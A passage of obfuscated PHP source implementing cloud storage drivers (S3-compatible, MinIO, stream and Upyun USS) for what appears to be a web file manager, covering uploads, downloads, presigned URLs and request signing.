"\142\171\x74\145\x73\x3d{$´äõáÓÊ}\x2d{$ƒ‡ıßÔâ}")); } public function upload($Ù€ø§º, $«ü©à¾Ñ, $©‘ÚÔşÜ = false, $Ú––¥‰™ = REPEAT_REPLACE) { $´Àªùƒû =& $_SERVER[ùèÅ´Ãš]; $ ìûÊä = array($´Àªùƒû[248] => @md5_file($«ü©à¾Ñ)); $  Óşã¹ = array($´Àªùƒû[249] => get_file_mime(get_path_ext($Ù€ø§º))); if (IO::size($«ü©à¾Ñ) <= 1024 * 1024 * 200) { $ÆÄ›’¡Æ = $this->client->putObjectFile($«ü©à¾Ñ, $this->bucket, $Ù€ø§º, $´Àªùƒû[232], $ ìûÊä, $  Óşã¹); return !empty($ÆÄ›’¡Æ) ? $this->getPathOuter($Ù€ø§º) : !1; } $¿Š¾ö = $this->client->multiUploadObject($«ü©à¾Ñ, $this->bucket, trim($Ù€ø§º, $´Àªùƒû[8]), $ ìûÊä, $  Óşã¹); return $¿Š¾ö ? $this->getPathOuter($Ù€ø§º) : !1; } public function download($ÊèãÅ­î, $”·ãí…ï) { if (!@is_dir($this->pathFather($”·ãí…ï)) && !IO::mkdir($this->pathFather($”·ãí…ï))) { return !1; } $ÏÍä¨” = $this->client->getObject($this->bucket, $ÊèãÅ­î, array(), $”·ãí…ï); return $ÏÍä¨” !== !1 ? $”·ãí…ï : !1; } public function link($›°û°², $™¥¡æûë = array()) { return $this->getPreSignedURL($›°û°², 3600 * 12, $™¥¡æûë); } private function getPreSignedURL($Ÿ€òãÈÕ, $€Ò˜‘İ», $·‰Ò¤‡’ = array(), $Œì—±½ = "\x47\105\124") { $í¡­¾øÌ =& $_SERVER[ùèÅ´Ãš]; $Ÿ€òãÈÕ = trim($Ÿ€òãÈÕ, $í¡­¾øÌ[8]); if ($this->signVer == $í¡­¾øÌ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $Ÿ€òãÈÕ, $€Ò˜‘İ», $Œì—±½, $·‰Ò¤‡’); } return $this->client->getPreSignedV4URL($this->bucket, $Ÿ€òãÈÕ, $€Ò˜‘İ», array(), $Œì—±½, $·‰Ò¤‡’); } public function fileOut($““ñéÉ, $ºš±šÄ = false, $×ˆ×äİ = false, $œ«Áş±œ = '') { $¦Ä õŸƒ =& $_SERVER[ùèÅ´Ãš]; if ($this->isFileOutServer()) { return $this->fileOutServer($““ñéÉ, $ºš±šÄ, $×ˆ×äİ, $œ«Áş±œ); } if (!$×ˆ×äİ) { $×ˆ×äİ = $this->pathThis($““ñéÉ); } $ÆÊ±¨ä  = get_file_mime(get_path_ext($×ˆ×äİ)); if ($ÆÊ±¨ä  == $¦Ä õŸƒ[251]) { return parent::fileOut($““ñéÉ, $ºš±šÄ, $×ˆ×äİ, $œ«Áş±œ); } $ÙôÚ–±‚ = array($¦Ä õŸƒ[252] => $ÆÊ±¨ä ); if ($ºš±šÄ) { $ÙôÚ–±‚[$¦Ä õŸƒ[253]] = $¦Ä õŸƒ[254] . rawurlencode($×ˆ×äİ); } else { } $é¨Œå¾Î = $this->link($““ñéÉ, $ÙôÚ–±‚); $this->fileOutLink($é¨Œå¾Î); } public function fileOutServer($ñ”ëÔ÷, $ÄÌÃ¶íĞ = false, $è°Å¡¹ì = false, $åÂ€àüí = '') { parent::fileOut($ñ”ëÔ÷, $ÄÌÃ¶íĞ, $è°Å¡¹ì, $åÂ€àüí); } public function fileOutImageServer($…½¢Üï, $Úœ÷Â»½ = 250) { parent::fileOutImage($…½¢Üï, $Úœ÷Â»½); } public function fileOutLink($ï­™ÚŠ¥) { $•û×Õ€’ =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($•û×Õ€’[67], $•û×Õ€’[66], $•û×Õ€’[68])) && !get_url_scheme($this->endpoint) && substr($ï­™ÚŠ¥, 0, 7) == $•û×Õ€’[219]) { $ï­™ÚŠ¥ = $•û×Õ€’[220] . substr($ï­™ÚŠ¥, 7); } header($•û×Õ€’[175] . $ï­™ÚŠ¥); die; } public function hashMd5($¬™©‹îâ, $Õ¶¤ˆî‘ = '') { $Îòâêì = $this->objectMeta($¬™©‹îâ); if (!$Îòâêì) { return !1; } $Õ¶¤ˆî‘ = $Õ¶¤ˆî‘ ? $Õ¶¤ˆî‘ : _get($Îòâêì, $_SERVER[ùèÅ´Ãš][255]); return $Õ¶¤ˆî‘; } public function uploadFormData($Ù×éÊ·¹, $ñÅ•Ù£ = 3600) { $ÛÖ¬ñò =& $_SERVER[ùèÅ´Ãš]; if (!$this->_isClientAsync()) { $š€çë±— = $this->getPreSignedURL($Ù×éÊ·¹, $ñÅ•Ù£, array(), $ÛÖ¬ñò[256]); return array($ÛÖ¬ñò[209] => str_replace($ÛÖ¬ñò[219], $ÛÖ¬ñò[257], $š€çë±—)); } if (isset($GLOBALS[$ÛÖ¬ñò[6]][$ÛÖ¬ñò[92]][$ÛÖ¬ñò[258]]) && $GLOBALS[$ÛÖ¬ñò[6]][$ÛÖ¬ñò[92]][$ÛÖ¬ñò[258]] == $ÛÖ¬ñò[231]) { return $this->uploadMultiData($Ù×éÊ·¹, $ñÅ•Ù£); } if ($this->signVer == $ÛÖ¬ñò[250]) { return $this->uploadFormDataV2($Ù×éÊ·¹, $ñÅ•Ù£); } return $this->uploadFormDataV4($Ù×éÊ·¹, $ñÅ•Ù£); } public function uploadFormDataV2($éš¯ÛÇ, $€ëÕíÎğ = 3600) { $£÷ê¤ùµ =& $_SERVER[ùèÅ´Ãš]; $Şó‘¨è“ = $this->pathFather($éš¯ÛÇ); $öı¨ÄõÏ = $this->client->getHttpUploadPostParams($this->bucket, $Şó‘¨è“, $£÷ê¤ùµ[232], $€ëÕíÎğ); $¦ÊÜø¿Í = array_merge((array) $öı¨ÄõÏ, array($£÷ê¤ùµ[259] => $£÷ê¤ùµ[250], $£÷ê¤ùµ[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($¦ÊÜø¿Í[$£÷ê¤ùµ[259]]); } return $¦ÊÜø¿Í; } public function uploadFormDataV4($ßƒ²‘Ì­, $›«Ïàüš = 3600) { $˜—‚²ÏÊ =& $_SERVER[ùèÅ´Ãš]; $õŒÏ¶† = $˜—‚²ÏÊ[232]; $İ‘æŒ÷ = $˜—‚²ÏÊ[260]; $¡ó°î¿Š = $˜—‚²ÏÊ[62]; $·½úàäª = gmdate($˜—‚²ÏÊ[261]); $ÚŒ¼‚Òõ = gmdate($˜—‚²ÏÊ[262]); $úŒ§š² = $˜—‚²ÏÊ[263]; $³ä£ÌÆ¦ = $›«Ïàüš . $˜—‚²ÏÊ[12]; $ÙÅ­£Óâ = $˜—‚²ÏÊ[264]; $£¾éÛ¡¾ = array($this->accessKey, $ÚŒ¼‚Òõ, $this->region, $¡ó°î¿Š, $úŒ§š²); $ß¦¾ı¬§ = implode($˜—‚²ÏÊ[8], $£¾éÛ¡¾); $Ë¨Õ§‘ç = array($˜—‚²ÏÊ[265] => gmdate($˜—‚²ÏÊ[266], strtotime($˜—‚²ÏÊ[267])), $˜—‚²ÏÊ[268] => array(array($˜—‚²ÏÊ[269] => $this->bucket), array($˜—‚²ÏÊ[270], $˜—‚²ÏÊ[271], $˜—‚²ÏÊ[12]), array($˜—‚²ÏÊ[270], $˜—‚²ÏÊ[272], $˜—‚²ÏÊ[12]), array($˜—‚²ÏÊ[273] => $ÙÅ­£Óâ), array($˜—‚²ÏÊ[274] => $ß¦¾ı¬§), array($˜—‚²ÏÊ[275] => $İ‘æŒ÷), array($˜—‚²ÏÊ[276] => $·½úàäª), array($˜—‚²ÏÊ[277] => $³ä£ÌÆ¦))); $Ëú³ü­ı = base64_encode(json_encode($Ë¨Õ§‘ç)); $ıóø¦ = hash_hmac($˜—‚²ÏÊ[278], $ÚŒ¼‚Òõ, $˜—‚²ÏÊ[279] . $this->secret, !0); $ ËÓŠÚÎ = hash_hmac($˜—‚²ÏÊ[278], $this->region, $ıóø¦, !0); $›˜ı±©¬ = hash_hmac($˜—‚²ÏÊ[278], $¡ó°î¿Š, $ ËÓŠÚÎ, !0); $¤é÷Ğ = hash_hmac($˜—‚²ÏÊ[278], $úŒ§š², $›˜ı±©¬, !0); $üÈÛåá½ = hash_hmac($˜—‚²ÏÊ[278], $Ëú³ü­ı, $¤é÷Ğ); $İ°ƒø•Ş = array($˜—‚²ÏÊ[249] => $˜—‚²ÏÊ[12], $˜—‚²ÏÊ[273] => $ÙÅ­£Óâ, $˜—‚²ÏÊ[280] => $Ëú³ü­ı, $˜—‚²ÏÊ[274] => $ß¦¾ı¬§, $˜—‚²ÏÊ[275] => $İ‘æŒ÷, $˜—‚²ÏÊ[276] => $·½úàäª, $˜—‚²ÏÊ[277] => $³ä£ÌÆ¦, $˜—‚²ÏÊ[281] => $üÈÛåá½, $˜—‚²ÏÊ[259] => $˜—‚²ÏÊ[250], $˜—‚²ÏÊ[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($İ°ƒø•Ş[$˜—‚²ÏÊ[259]]); } return $İ°ƒø•Ş; } public function uploadMultiData($•ÁÏÅğ¡, $Çíçì°’ = 3600) { $èŸ¼ÙËÈ =& $_SERVER[ùèÅ´Ãš]; $†ÈÛùæı = $this->signVer == $èŸ¼ÙËÈ[250] ? gmdate($èŸ¼ÙËÈ[282]) : gmdate($èŸ¼ÙËÈ[283]); $â€°¸“ = array(); $êÂºò¥¹ = $this->client->getUploadId($this->bucket, $•ÁÏÅğ¡, $â€°¸“); if (!$êÂºò¥¹) { return !1; } $Ÿ×ªî”¡ = array($èŸ¼ÙËÈ[284] => $êÂºò¥¹, $èŸ¼ÙËÈ[209] => $this->getHost() . $èŸ¼ÙËÈ[8] . $this->pathEncode($•ÁÏÅğ¡), $èŸ¼ÙËÈ[285] => $†ÈÛùæı, $èŸ¼ÙËÈ[97] => $•ÁÏÅğ¡, $èŸ¼ÙËÈ[259] => $this->signVer); if ($this->_isClientAsync()) { unset($Ÿ×ªî”¡[$èŸ¼ÙËÈ[259]]); } return $Ÿ×ªî”¡; } public function uploadMultiAuth($îõ·Ê¬Ï, $‡Ş…§¥ = array()) { $¬˜‹Ø¼¢ =& $_SERVER[ùèÅ´Ãš]; if ($this->signVer == $¬˜‹Ø¼¢[250]) { if (isset($‡Ş…§¥[$¬˜‹Ø¼¢[286]])) { return $this->uploadPartAuthV2($îõ·Ê¬Ï, $‡Ş…§¥); } return $this->uploadListAuthV2($îõ·Ê¬Ï, $‡Ş…§¥); } if (isset($‡Ş…§¥[$¬˜‹Ø¼¢[286]])) { return $this->uploadPartAuthV4($îõ·Ê¬Ï, $‡Ş…§¥); } return $this->uploadListAuthV4($îõ·Ê¬Ï, $‡Ş…§¥); } public function uploadPartAuthV2($Ì®­œ§ñ, $½¯ÆÌ±ø = array()) { $ØÎ×·Àç =& $_SERVER[ùèÅ´Ãš]; $î–šà¹å = $½¯ÆÌ±ø[$ØÎ×·Àç[97]]; $ÅÚ§—“• = gmdate($ØÎ×·Àç[282]); $å¥Ãò‰ = array_intersect_key($½¯ÆÌ±ø, array_flip(array($ØÎ×·Àç[286], $ØÎ×·Àç[284]))); ksort($å¥Ãò‰); $ƒÙ… = $å¥Ãò‰ ? $ØÎ×·Àç[76] . http_build_query($å¥Ãò‰, null, $ØÎ×·Àç[287], PHP_QUERY_RFC3986) : $ØÎ×·Àç[12]; $ç©¬µ± = array($ØÎ×·Àç[256], $ØÎ×·Àç[12], $ØÎ×·Àç[123], $ØÎ×·Àç[12], "\170\55\x61\155\x7a\x2d\144\x61\x74\145\72{$ÅÚ§—“•}", $ØÎ×·Àç[8] . $this->bucket . $ØÎ×·Àç[8] . $this->pathEncode($î–šà¹å) . $ƒÙ…); $‚ÈØ…Ÿæ = implode($ØÎ×·Àç[288], $ç©¬µ±); $¤šèÜˆí = $this->client->__getSignature($‚ÈØ…Ÿæ); return array($ØÎ×·Àç[289] => $¤šèÜˆí, $ØÎ×·Àç[285] => $ÅÚ§—“•); } public function uploadListAuthV2($€€‰îó“, $–óšè‰ = array()) { $É¤°àç =& $_SERVER[ùèÅ´Ãš]; $äÓ–Å„â = $–óšè‰[$É¤°àç[97]]; $‘ËÇ…¢‘ = $–óšè‰[$É¤°àç[284]]; $©Ğ£†Ù· = $this->client->listParts($this->bucket, $äÓ–Å„â, $‘ËÇ…¢‘); if (!$©Ğ£†Ù·) { return !1; } $Šİî•µô = gmdate($É¤°àç[282]); $ÎîŠÛ¡ó = $É¤°àç[290] . $‘ËÇ…¢‘; $ÄÍó“ó¯ = array($É¤°àç[291], $É¤°àç[12], $É¤°àç[123], $É¤°àç[12], "\x78\55\141\155\172\55\144\141\x74\x65\72{$Šİî•µô}", $É¤°àç[8] . $this->bucket . $É¤°àç[8] . $this->pathEncode($äÓ–Å„â) . $ÎîŠÛ¡ó); $ûş¨ôá› = implode($É¤°àç[288], $ÄÍó“ó¯); $œÏÔÊÛÄ = $this->client->__getSignature($ûş¨ôá›); return array($É¤°àç[289] => $œÏÔÊÛÄ, $É¤°àç[285] => $Šİî•µô, $É¤°àç[292] => $©Ğ£†Ù·); } public function uploadPartAuthV4($‚£÷è‘†, $Üûá«îÛ = array()) { $€²©ŠÏù =& $_SERVER[ùèÅ´Ãš]; $ã€·òÛØ = $Üûá«îÛ[$€²©ŠÏù[97]]; $âÌïßÙ = array($€²©ŠÏù[276] => gmdate($€²©ŠÏù[283]), $€²©ŠÏù[293] => _get($Üûá«îÛ, $€²©ŠÏù[294], hash($€²©ŠÏù[278], $€²©ŠÏù[12]))); $ç„ı¢î = explode($€²©ŠÏù[211], $this->getHost()); $èÜ¡´ˆ¡ = array($€²©ŠÏù[295] => $ç„ı¢î[1], $€²©ŠÏù[296] => $€²©ŠÏù[12], $€²©ŠÏù[249] => $€²©ŠÏù[123], $€²©ŠÏù[297] => $Üûá«îÛ[$€²©ŠÏù[79]]); $²å–ÑáÕ = $€²©ŠÏù[256]; $„×ïÁ½ı = $€²©ŠÏù[8] . $this->pathEncode($ã€·òÛØ); $—ÀŸØÇâ = array_intersect_key($Üûá«îÛ, array_flip(array($€²©ŠÏù[286], $€²©ŠÏù[284]))); $èè‚Øœü = $this->client->__getSignatureV4($âÌïßÙ, $èÜ¡´ˆ¡, $²å–ÑáÕ, $„×ïÁ½ı, $—ÀŸØÇâ); return array($€²©ŠÏù[289] => $èè‚Øœü, $€²©ŠÏù[293] => $âÌïßÙ[$€²©ŠÏù[293]], $€²©ŠÏù[285] => $âÌïßÙ[$€²©ŠÏù[276]]); } public function uploadListAuthV4($¶ñÍñ‰´, $¸¦È±º¨ = array()) { $©ÏÇÃ†å =& $_SERVER[ùèÅ´Ãš]; $ºÄ–«§ü = $¸¦È±º¨[$©ÏÇÃ†å[97]]; $Öøì¥ = $¸¦È±º¨[$©ÏÇÃ†å[284]]; $›¡ïŞÎí = $this->client->listParts($this->bucket, $ºÄ–«§ü, $Öøì¥); if (!$›¡ïŞÎí) { return !1; } $ñ×ğ²ìÍ = $©ÏÇÃ†å[298]; foreach ($›¡ïŞÎí as $Ø«ú·³®) { $ñ×ğ²ìÍ .= $©ÏÇÃ†å[299] . "\x3c\120\x61\162\x74\x4e\x75\x6d\142\x65\162\76{$Ø«ú·³®[$©ÏÇÃ†å[300]]}\x3c\x2f\x50\x61\162\164\116\x75\x6d\142\145\x72\76\xa" . "\x3c\105\x54\x61\147\x3e{$Ø«ú·³®[$©ÏÇÃ†å[301]]}\x3c\57\x45\x54\141\x67\x3e\xa" . $©ÏÇÃ†å[302]; } $ñ×ğ²ìÍ .= $©ÏÇÃ†å[303]; $Ò§ıÚŠ« = array($©ÏÇÃ†å[276] => gmdate($©ÏÇÃ†å[283]), $©ÏÇÃ†å[293] => hash($©ÏÇÃ†å[278], $ñ×ğ²ìÍ)); $ÂéÍÌ¾Ê = explode($©ÏÇÃ†å[211], $this->getHost()); $üÆÔ‚ì¼ = array($©ÏÇÃ†å[295] => $ÂéÍÌ¾Ê[1], $©ÏÇÃ†å[249] => $©ÏÇÃ†å[123], $©ÏÇÃ†å[297] => strlen($ñ×ğ²ìÍ)); $Â–·ÀÅÚ = $©ÏÇÃ†å[291]; $Ì¡…ØŠë = $©ÏÇÃ†å[8] . $this->pathEncode($ºÄ–«§ü); $–äÏ–Ï = array($©ÏÇÃ†å[284] => $Öøì¥); $Ì±áÆ×“ = $this->client->__getSignatureV4($Ò§ıÚŠ«, $üÆÔ‚ì¼, $Â–·ÀÅÚ, $Ì¡…ØŠë, $–äÏ–Ï); return array($©ÏÇÃ†å[289] => $Ì±áÆ×“, $©ÏÇÃ†å[293] => $Ò§ıÚŠ«[$©ÏÇÃ†å[293]], $©ÏÇÃ†å[285] => $Ò§ıÚŠ«[$©ÏÇÃ†å[276]], $©ÏÇÃ†å[292] => $›¡ïŞÎí); } private function _isClientAsync() { $›í™™œ =& $_SERVER[ùèÅ´Ãš]; static $£–‰¢”ú = null; if ($£–‰¢”ú === null) { $–ƒè«„’ = isset($_REQUEST[$›í™™œ[304]]) ? json_decode($_REQUEST[$›í™™œ[304]], !0) : !1; $£–‰¢”ú = $–ƒè«„’ && _get($–ƒè«„’, $›í™™œ[305]) == $›í™™œ[306]; } return $£–‰¢”ú; } public function getHost() { $óéõòÙ˜ =& $_SERVER[ùèÅ´Ãš]; $¶üùĞÖÌ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($óéõòÙ˜[70], $óéõòÙ˜[64], $óéõòÙ˜[69], $óéõòÙ˜[62]))) { return $¶üùĞÖÌ . $óéõòÙ˜[8] . $this->bucket; } if ($this->osType == $óéõòÙ˜[62] && !is_domain($¶üùĞÖÌ)) { return $¶üùĞÖÌ . $óéõòÙ˜[8] . $this->bucket; } $¶üùĞÖÌ = explode($óéõòÙ˜[211], $¶üùĞÖÌ); return $¶üùĞÖÌ[0] . $óéõòÙ˜[211] . $this->bucket . $óéõòÙ˜[10] . $¶üùĞÖÌ[1]; } public function size($àòœ·Œ‚) { $˜ëÉ¬Çü = $this->objectMeta($àòœ·Œ‚); return $˜ëÉ¬Çü ? $˜ëÉ¬Çü[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function info($Ç—»×òå) { if ($this->isFolder($Ç—»×òå)) { return $this->folderInfo($Ç—»×òå); } else { if ($this->isFile($Ç—»×òå)) { return $this->fileInfo($Ç—»×òå); } } return !1; } public function exist($¢‹•Œ“Ê) { return $this->isFile($¢‹•Œ“Ê) || $this->isFolder($¢‹•Œ“Ê); } public function isFile($áÛÃ¶Çè) { return !$this->isFolder($áÛÃ¶Çè) && $this->objectMeta($áÛÃ¶Çè); } public function isFolder($¬Ê­³Í) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][180], $¬Ê­³Í); } protected function objectMeta($Ó¥©”Æª) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][182], $Ó¥©”Æª); } protected function _objectMeta($¼‹Ù¯ïÀ) { $•ˆ‹¢ =& $_SERVER[ùèÅ´Ãš]; $¼‹Ù¯ïÀ = rtrim($¼‹Ù¯ïÀ, $•ˆ‹¢[8]); try { $¤ëÂó“ô = $this->client->getObjectInfo($this->bucket, $¼‹Ù¯ïÀ); if (!isset($¤ëÂó“ô[$•ˆ‹¢[255]]) && isset($¤ëÂó“ô[$•ˆ‹¢[307]])) { $¤ëÂó“ô[$•ˆ‹¢[255]] = $¤ëÂó“ô[$•ˆ‹¢[307]]; } } catch (Exception $ò¯’ìÅ) { $¤ëÂó“ô = !1; } if (!$¤ëÂó“ô) { } return $¤ëÂó“ô; } protected function _isFolder($Ìñ·½Í³) { $¦Î—ŸÅ =& $_SERVER[ùèÅ´Ãš]; $Ìñ·½Í³ = rtrim($Ìñ·½Í³, $¦Î—ŸÅ[8]) . $¦Î—ŸÅ[8]; if ($Ìñ·½Í³ == $¦Î—ŸÅ[12] || $Ìñ·½Í³ == $¦Î—ŸÅ[8]) { return !0; } $ó›ï«™¼ = $this->client->getBucket($this->bucket, $Ìñ·½Í³, null, 1); if (empty($ó›ï«™¼[$¦Î—ŸÅ[239]])) { return !1; } $ê ¶–¸ = $ó›ï«™¼[$¦Î—ŸÅ[239]][0][$¦Î—ŸÅ[32]]; return stripos($ê ¶–¸, $Ìñ·½Í³) === 0 ? !0 : !1; if (substr($ê ¶–¸, -1) == $¦Î—ŸÅ[8]) { return !0; } if (get_path_this($ê ¶–¸) == get_path_this($Ìñ·½Í³)) { return !1; } return !0; } public function listObject($şïÎô“Á) { return $this->fileList($şïÎô“Á, $_SERVER[ùèÅ´Ãš][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ñóĞ²’¡) { $æÄÙÕ•ü =& $_SERVER[ùèÅ´Ãš]; parent::__construct($ñóĞ²’¡); $this->setSignVersion($æÄÙÕ•ü[250]); if (!$this->region) { $this->region = $æÄÙÕ•ü[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $®¯›—‰ = $this->getBktRegion(); return $this->region == $®¯›—‰ ? !0 : !1; } public function uploadFormData($í½À¯, $ ÑÂÑ¯ = 3600) { $”…ğÑªø =& $_SERVER[ùèÅ´Ãš]; $õ›ÑÌğ› = $”…ğÑªø[232]; $ûñ„ıÔ = $”…ğÑªø[260]; $©×¢üĞ = $”…ğÑªø[62]; $ô¥Üƒ’„ = gmdate($”…ğÑªø[261]); $”ÙÍ ­„ = gmdate($”…ğÑªø[262]); $¤®Ä–ˆ… = $”…ğÑªø[263]; $Å”º± = $ ÑÂÑ¯ . $”…ğÑªø[12]; $çÄŸ‘ë = $”…ğÑªø[264]; $ìóùô‰ = array($this->accessKey, $”ÙÍ ­„, $this->region, $©×¢üĞ, $¤®Ä–ˆ…); $Á…Ü ÁÀ = implode($”…ğÑªø[8], $ìóùô‰); $ÔÈµüıê = array($”…ğÑªø[265] => gmdate($”…ğÑªø[266], strtotime($”…ğÑªø[267])), $”…ğÑªø[268] => array(array($”…ğÑªø[269] => $this->bucket), array($”…ğÑªø[309] => $õ›ÑÌğ›), array($”…ğÑªø[270], $”…ğÑªø[271], $”…ğÑªø[12]), array($”…ğÑªø[270], $”…ğÑªø[272], $”…ğÑªø[12]), array($”…ğÑªø[270], $”…ğÑªø[310], $”…ğÑªø[12]), array($”…ğÑªø[273] => $çÄŸ‘ë), array($”…ğÑªø[274] => $Á…Ü ÁÀ), array($”…ğÑªø[275] => $ûñ„ıÔ), array($”…ğÑªø[276] => $ô¥Üƒ’„), array($”…ğÑªø[277] => $Å”º±))); $òÛ´ô€’ = base64_encode(json_encode($ÔÈµüıê)); $´¶âÒ›à = hash_hmac($”…ğÑªø[278], $”ÙÍ ­„, $”…ğÑªø[279] . $this->secret, !0); $Ù±ŸÍ— = hash_hmac($”…ğÑªø[278], $this->region, $´¶âÒ›à, !0); $¿ŠéÎ·÷ = hash_hmac($”…ğÑªø[278], $©×¢üĞ, $Ù±ŸÍ—, !0); $‰µ¸â¯ˆ = hash_hmac($”…ğÑªø[278], $¤®Ä–ˆ…, $¿ŠéÎ·÷, !0); $é¶Óúüñ = hash_hmac($”…ğÑªø[278], $òÛ´ô€’, $‰µ¸â¯ˆ); $ÂÁ‡êØø = array($”…ğÑªø[249] => $”…ğÑªø[12], $”…ğÑªø[297] => $”…ğÑªø[12], $”…ğÑªø[309] => $õ›ÑÌğ›, $”…ğÑªø[273] => $çÄŸ‘ë, $”…ğÑªø[280] => $òÛ´ô€’, $”…ğÑªø[311] => $Á…Ü ÁÀ, $”…ğÑªø[312] => $ûñ„ıÔ, $”…ğÑªø[313] => $ô¥Üƒ’„, $”…ğÑªø[314] => $Å”º±, $”…ğÑªø[315] => $é¶Óúüñ, $”…ğÑªø[209] => $this->getHost()); return $ÂÁ‡êØø; } } goto AĞªã·ßÏ; Fä·Ç‹¦: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($á£Á”‰Ê, $‰äëîğğ = 0) { parent::__construct(); $this->source = $á£Á”‰Ê; $this->sourceSize = $‰äëîğğ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ô˜Õ£ = false) { return $this->sourceSize; } public function getContent($ìŞ›çî‹ = false) { return $this->fileSubstr($ìŞ›çî‹, 0, $this->sourceSize); } public function fileSubstr($Ü”ÌÕ—ñ = false, $ËÎö¢¤Ï = 0, $£Éùæœ• = 0) { if (!$£Éùæœ•) { $£Éùæœ• = $this->sourceSize; } $ßä¡£ù = $this->sourceSize - $ËÎö¢¤Ï; if ($£Éùæœ• >= $ßä¡£ù) { $£Éùæœ• = $ßä¡£ù; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ËÎö¢¤Ï, $£Éùæœ•); } if ($this->sourceType == self::TYPE_FILE) { if ($£Éùæœ• <= 0) { return $_SERVER[ùèÅ´Ãš][12]; } $À‘ÔÏÑ— = ftell($this->source); fseek_64($this->source, $À‘ÔÏÑ— + $ËÎö¢¤Ï); $÷  “¹’ = @fread($this->source, $£Éùæœ•); fseek_64($this->source, $À‘ÔÏÑ—); return $÷  “¹’; } } public function hashMd5($»”¿ôê  = false) { return md5($this->getContent()); } public static function hash($ÊûµÉæ–, $¸ÆĞª¹ã = 0) { $ìÒ³™å = new PathDriverStream($ÊûµÉæ–, $¸ÆĞª¹ã); return $ìÒ³™å->hashSimple($ÊûµÉæ–); } public static function md5($€ôí„Ù÷, $ŸÚƒÙ‹õ = 0) { $—††Ô” = new PathDriverStream($€ôí„Ù÷, $ŸÚƒÙ‹õ); return $—††Ô”->hashMd5($€ôí„Ù÷); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\x2f\57\166\x30\x2e\141\160\151\x2e\165\160\171\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ºúò™Á†) { parent::__construct(); $this->_init($ºúò™Á†); } public function _init($°¿¤‚ş) { $ĞÎÇ˜ÇÄ =& $_SERVER[ùèÅ´Ãš]; foreach ($°¿¤‚ş as $ƒï¯İ§œ => $©ƒß‘©—) { if (isset($this->{$ƒï¯İ§œ})) { $this->{$ƒï¯İ§œ} = $©ƒß‘©—; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ĞÎÇ˜ÇÄ[1566] . LNG($ĞÎÇ˜ÇÄ[1486])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÌÖ¿„Ùï, $Ÿ¥šŠÉª = "\107\105\124") { $¸¼›ĞØ¥ =& $_SERVER[ùèÅ´Ãš]; $ë×‡«®æ = gmdate($¸¼›ĞØ¥[1515]); $œû÷êŸ¨ = base64_encode(hash_hmac($¸¼›ĞØ¥[1567], "{$Ÿ¥šŠÉª}\x26{$ÌÖ¿„Ùï}\46{$ë×‡«®æ}", md5("{$this->userpass}"), !0)); $…ğ—Æôò = array("\x41\x75\164\x68\157\x72\151\x7a\x61\x74\151\x6f\x6e\x3a\x55\x50\131\125\x4e\x20{$this->username}\x3a{$œû÷êŸ¨}", "\x44\141\164\x65\72{$ë×‡«®æ}"); return $…ğ—Æôò; } public function ussRequest($ì±¢ÚÅï, $¼Ÿ€îØø = "\x47\105\124", $–çë© = false, $ÚñøÔ¢Ø = false, $è›Â…Œå = false) { $ªÄ·á• =& $_SERVER[ùèÅ´Ãš]; $ì±¢ÚÅï = trim($ì±¢ÚÅï, $ªÄ·á•[8]); $ñŒíßø = "\57{$this->bucket}\x2f" . rawurlencode($ì±¢ÚÅï); $â´Üö = $this->ussHeaders($ñŒíßø, $¼Ÿ€îØø); if ($ÚñøÔ¢Ø) { $â´Üö = array_merge($â´Üö, $ÚñøÔ¢Ø); } $ÅÈ×ğğ• = url_request($this->endpoint . $ñŒíßø, $¼Ÿ€îØø, $–çë©, $â´Üö, $è›Â…Œå); if (!$ÅÈ×ğğ•) { $¹ææÀú· = LNG($ªÄ·á•[1568]); $this->writeLog($¹ææÀú·); return array($ªÄ·á•[1311] => !1, $ªÄ·á•[1301] => $¹ææÀú·); } if (strtolower($¼Ÿ€îØø) == $ªÄ·á•[230] || in_array($ÅÈ×ğğ•[$ªÄ·á•[1311]], array($ªÄ·á•[264], $ªÄ·á•[1569]))) { $–çë© = $ÅÈ×ğğ•[$ªÄ·á•[1570]]; if (!$ÅÈ×ğğ•[$ªÄ·á•[827]]) { $–çë© = isset($–çë©[0]) ? $–çë©[0] : $ªÄ·á•[12]; } } else { $–çë© = json_decode($ÅÈ×ğğ•[$ªÄ·á•[1301]], !0); if (!$–çë©) { $–çë© = $ÅÈ×ğğ•[$ªÄ·á•[1301]]; } else { if (!$ÅÈ×ğğ•[$ªÄ·á•[827]] && isset($–çë©[$ªÄ·á•[1571]])) { $–çë© = $–çë©[$ªÄ·á•[1571]]; } } } if (!$ÅÈ×ğğ•[$ªÄ·á•[827]]) { $this->writeLog($this->__errorMessage($–çë©)); } return array($ªÄ·á•[1311] => $ÅÈ×ğğ•[$ªÄ·á•[827]], $ªÄ·á•[1301] => $–çë©); } private function __errorMessage($Š˜©åù¹) { $¾ê×÷ ğ =& $_SERVER[ùèÅ´Ãš]; if (!$Š˜©åù¹) { return $¾ê×÷ ğ[12]; } static $·Éè¹äË = null; if (!$·Éè¹äË) { $·Éè¹äË = I18n::getType(); } if ($·Éè¹äË != $¾ê×÷ ğ[1524]) { return $Š˜©åù¹; } $ëÏ¨Î³½ = array($¾ê×÷ 